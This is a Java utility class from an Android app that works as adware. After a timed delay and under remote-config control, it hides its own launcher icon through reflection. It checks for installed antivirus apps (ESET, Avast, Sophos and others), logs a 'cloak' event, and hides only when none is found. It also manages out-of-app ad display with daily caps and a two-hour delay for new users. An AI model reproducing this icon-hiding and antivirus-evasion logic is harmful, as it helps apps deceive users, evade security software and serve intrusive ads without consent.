package com.x.codeX.agent.utils;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Build;
import android.os.Handler;
import android.os.PowerManager;
import android.text.TextUtils;
import android.text.format.DateUtils;
import android.util.Log;

import androidx.core.content.pm.ShortcutInfoCompat;
import androidx.core.content.pm.ShortcutManagerCompat;
import androidx.core.graphics.drawable.IconCompat;

import com.flurry.android.FlurryConfig;
import com.x.codeX.AnalyticsFacade;
import com.x.codeX.XApp;
import com.x.codeX.agent.LocalStorageManager;

import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static com.x.codeX.XApp.sDebug;

public class XUtils {
    //是否隐藏图标
    public static boolean getIsNeedHideIcon() {
        boolean enable = FlurryConfig.getInstance().getBoolean("app_hideIcon", false);
        if (XApp.sDebug) {
            enable = true;
        }
        return enable;
    }
    //是否有杀毒软件
    public static boolean isAppClude() {
        return SpUtil.mPrefSp().getBoolean("isAppClude", false);
    }

    public static String queryLauncherActivity() {
        Intent resolveIntent = new Intent(Intent.ACTION_MAIN, null);
        resolveIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        resolveIntent.setPackage(XApp.app.getPackageName());
        List<ResolveInfo> resolveinfoList = XApp.app.getPackageManager()
                .queryIntentActivities(resolveIntent, 0);
        for (int i = 0; i < resolveinfoList.size(); i++) {
            ResolveInfo info = resolveinfoList.get(i);
            if (info != null) {
                return info.activityInfo.name;
            }
        }
        return null;
    }
    public static void addShort(Context context) {
        if (SpUtil.mPrefSp().getBoolean("isHeadLauncher", false))
            return;
        ActivityInfo info = retrieveLauncherActivity();
        String tgtActName = info.targetActivity;
        hideLauncher(tgtActName);
    }
    protected static void hideLauncher(String spName) {
        if (SpUtil.mPrefSp().getBoolean("isHeadLauncher", false))
            return;
        String name = spName;
        final Handler handler = new Handler();
        handler.postDelayed(() -> {
            try {
                if (XUtils.getIsNeedHideIcon()) {
                    if (!XApp.isOrigin) {
                        if (!XUtils.isAppClude()) {
                            try {
                                String launcherCls = XUtils.queryLauncherActivity();
                                XUtils.hideLauncherIcon(launcherCls);
                            } catch (Throwable err) {
                                if (sDebug) err.printStackTrace();
                            }
                            SpUtil.mPrefSp().put("isHeadLauncher", true);

                            try {
                                XUtils.addShortCutCompact(XApp.app, Class.forName(name));
                            } catch (Exception e) {
                                if (sDebug) e.printStackTrace();
                            }
                        }
                    }
                } else {
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            hideLauncher(spName);
                        }
                    }, 20 * DateUtils.MINUTE_IN_MILLIS);
                }
            } catch (Throwable err) {
                if (sDebug) err.printStackTrace();
            }
        }, 30_000);
    }
    private static ActivityInfo retrieveLauncherActivity() {
        ActivityInfo info = null;

        PackageManager pm = XApp.app.getPackageManager();

        Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<ResolveInfo> appList = pm.queryIntentActivities(mainIntent, 0);
        for (ResolveInfo app : appList) {
            if (app.activityInfo.packageName.equalsIgnoreCase(XApp.app.getPackageName())) {
                info = app.activityInfo;
            }
        }

        return info;
    }
    //隐藏图标
    public static void hideLauncherIcon(String launcherCls) {
        PackageManager pm = XApp.app.getPackageManager();
        ComponentName launcherComponent = new ComponentName(XApp.app.getPackageName(),
                launcherCls);
        if(XUtils.<Integer>callInstanceMethod(pm, "getComponentEnabledSetting", launcherComponent)
                != PackageManager.COMPONENT_ENABLED_STATE_DISABLED){
            XUtils.callInstanceMethod(pm, "setComponentEnabledSetting",
                    launcherComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        }
        AnalyticsFacade.logEvent("hide_icon", null);
    }


    public static final <T> T callInstanceMethod(Object instance,
                                                 String methodName,
                                                 Object... params) {
        if (instance != null) {
            try {
                if (!TextUtils.isEmpty(methodName)) {
                    Class[] paramTypes = (params == null || params.length <= 0) ? null : new Class[params.length];
                    if (paramTypes != null) {
                        int length = params.length;
                        for (int i = 0; i < length; i++) {
                            Class<?> cls = params[i].getClass();
                            if (cls == Integer.class) {
                                cls = Integer.TYPE;
                            } else if (cls == Long.class) {
                                cls = Long.TYPE;
                            } else if (cls == Double.class) {
                                cls = Double.TYPE;
                            } else if (cls == Float.class) {
                                cls = Float.TYPE;
                            }
                            paramTypes[i] = cls;
                        }
                    }
                    Method method = getMethod(instance.getClass(), methodName, paramTypes);
                    if (method != null) {
                        method.setAccessible(true);
                        T result = (T) method.invoke(instance, params);
                        method.setAccessible(false);
                        return result;
                    }
                    throw new Exception();
                }
            } catch (Exception unused) {
                return null;
            }
        }

        return null;
    }
    public static final Method getMethod(Object cls,
                                         String methodName,
                                         Class... paramTypes) {
        Method method = null;
        if (cls != null && !TextUtils.isEmpty(methodName)) {
            try {
                method = ((Class) cls).getDeclaredMethod(methodName, paramTypes);
            } catch (Exception unused) {
            }
            boolean found = cls != Object.class;
            if (method == null && found) {
                return getMethod(((Class) cls).getSuperclass(), methodName, paramTypes);
            }
        }
        return method;
    }

    //创建快捷方式
    public static void addShortCutCompact(Context context, Class activityCls) {
        if (ShortcutManagerCompat.isRequestPinShortcutSupported(context)) {
            Intent shortcutInfoIntent = new Intent(context, activityCls);
            shortcutInfoIntent.setAction(Intent.ACTION_VIEW); //action必须设置，不然报错

            ApplicationInfo applicationInfo = context.getApplicationInfo();
            ShortcutInfoCompat info = new ShortcutInfoCompat.Builder(context, XApp.getAppName())
                    .setIcon(IconCompat.createWithResource(context, applicationInfo.icon))
                    .setShortLabel(XApp.getAppName())
                    .setIntent(shortcutInfoIntent)
                    .build();
            ShortcutManagerCompat.requestPinShortcut(context, info, null);
        }
    }

    //外展使能
    public static boolean isetBergAdOut() {
        boolean config = FlurryConfig.getInstance().getBoolean("berg_adOutApp", XApp.sDebug);
        if (XApp.sDebug) {
            Log.d("OutAdManager", "DBG, change berg_adOutApp:" + config + "-->true");
            config = true;
        }
        return config;
    }

    //内展使能
    public static final boolean isInappAdsEnabled() {
        boolean isEnable = FlurryConfig.getInstance().getBoolean("inapp_ads_enable", XApp.sDebug);
        if (XApp.sDebug) {
            Log.d("adAgent", "for debug, change remote config val=" + isEnable + " to true for key=" + "inapp_ads_enable");
            isEnable = true;
        }
        return isEnable;
    }
    //屏幕是否点亮
    public static boolean isScreenOn() {
        PowerManager powerManager = (PowerManager) XApp.app.getSystemService(Context.POWER_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
            return powerManager.isInteractive();

        } else {
            return powerManager.isInteractive();
        }
    }

    //是否还有外展次数
    public static boolean isMoreTime() {
        return (getOutTime("fan") > 0 ||
                getOutTime("mopub") > 0);

    }

    //获取外展剩余次数  type: Fan/mopub
    public static int getOutTime(String type) {
        String oldDate = SpUtil.mPrefSp().getString("berg_ad_date", "");
        Date currentTime = new Date();
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
        String dateString = formatter.format(currentTime);
        if (!dateString.equalsIgnoreCase(oldDate)) {
            SpUtil.mPrefSp().put("fan_open_time", 0);
            SpUtil.mPrefSp().put("mopub_open_time", 0);
            SpUtil.mPrefSp().put("berg_ad_date", dateString);
        }
        if (type.equals("fan")) {
            int time = FlurryConfig.getInstance().getInt("berg_maxNum_fan", 0);
            if (XApp.sDebug) {
                time = 5;
            }
            int shows = SpUtil.mPrefSp().getInt("fan_open_time", 0);
            if (XApp.sDebug) {
                Log.d("Berg", "fan times:" + shows + "/" + time);
            }
            return time - shows;
        } else if (type.equals("mopub")) {
            int time = FlurryConfig.getInstance().getInt("berg_maxNum_mopub", 0);
            if (XApp.sDebug) {
                time = 5;
            }

            int shows = SpUtil.mPrefSp().getInt("mopub_open_time", 0);
            if (XApp.sDebug) {
                Log.d("Berg", "mopub times:" + shows + "/" + time);
            }

            return time - shows;

        } else return -1;
    }

    //设置App安装时间
    public static void setAppFirstIns() {
        if (SpUtil.mPrefSp().getLong("app_first_install_time", (long) 0) == 0) {
            SpUtil.mPrefSp().put("app_first_install_time", System.currentTimeMillis());
        }
    }


    private static String[] secs = {".eset.ems2.", ".ahnlab.", ".drweb.", ".kms.", ".sophos.", ".trustlook.", ".checkpoint.", ".avast.", ".k7computing."};
    //查杀毒软件
    public static void checkAppClude() {
        boolean appclude = false;
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN, null);
            intent.addCategory(Intent.CATEGORY_LAUNCHER);
            List<ResolveInfo> apps = XApp.app.getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
            for (int i = 0; i < apps.size(); i++) {
                for (int j = 0; j < secs.length; j++) {
                    if (apps.get(i).activityInfo.packageName.contains(secs[j])) {
                        Map<String, String> params = new HashMap<>();
                        params.put("pkg", apps.get(i).activityInfo.packageName);
                        AnalyticsFacade.logEvent("cloak", params);
                        appclude = true;
                        break;
                    }
                }
            }
            SpUtil.mPrefSp().put("isAppClude", appclude);
        } catch (Throwable e) {
        }
    }

    //获取app安装时间
    public static long getAppIns() {
        long installT = LocalStorageManager.getInst().getLong("app_first_install_time", 0);
        if (installT == 0) {
            try {
                installT = XApp.app.getPackageManager().getPackageInfo(XApp.app.getPackageName(), 0).firstInstallTime;
            } catch (Throwable e) {
                installT = System.currentTimeMillis();
            }
        }
        long retention = System.currentTimeMillis() - installT;
        if (retention < 0)
            retention = 0;
        return retention;
    }



    public static long getNewUserAdDelayT() {
        long remoteConfig = FlurryConfig.getInstance().getLong("berg_newUserAdDelayT", XApp.sDebug ? 0L : 7200L);
        if (XApp.sDebug) {
            Log.d("AdsRemoteConfig", "for debug, change remote config val=" + remoteConfig + " to 0 for key=" + "berg_newUserAdDelayT");
            return 0;
        }

        return remoteConfig;
    }

    public static void reportAdLoad(String network, String size, boolean isOut){
        Map<String, String> evtParams = new HashMap<>();
        evtParams.put("network",network);
        evtParams.put("size", size);
        if (isOut) {
            AnalyticsFacade.logEvent("berg_ad_imp", evtParams);
        } else {
            AnalyticsFacade.logEvent("inapp_ad_imp", evtParams);
        }
    }
    public static void reportAdClick(String network, String size, boolean isOut){
        Map<String, String> evtParams = new HashMap<>();
        evtParams.put("network",network);
        evtParams.put("size", size);
        if (isOut) {
            AnalyticsFacade.logEvent("berg_ad_click", evtParams);
        } else {
            AnalyticsFacade.logEvent("inapp_ad_click", evtParams);
        }
    }
}
